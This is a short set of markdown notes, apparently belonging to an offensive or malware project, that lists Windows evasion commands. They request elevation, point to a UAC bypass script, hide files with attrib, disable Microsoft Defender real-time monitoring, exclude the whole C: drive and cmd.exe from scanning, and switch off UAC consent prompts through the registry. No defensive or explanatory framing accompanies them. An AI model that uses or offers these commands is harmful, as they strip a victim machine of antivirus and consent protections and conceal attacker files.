## Notes

# Requesting elevation
```
powershell Start-Process PowerShell -Verb RunAs -FilePath
```

- Bypass UAC
  * see wget.cmd

- hide files
  * ```
    # show files
    attrib -h -s -r FILE

    # hide files
    attrib +h +s +r FILE
    ```

- Exclusions
  ```
  Set-MpPreference -DisableRealtimeMonitoring true
  Add-MpPreference -ExclusionPath C:\
  Add-MpPreference -ExclusionProcess C:\windows\system32\cmd.exe
  ```

- Disable UAC
  ```
  powershell Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviourAdmin -Value 0
  ```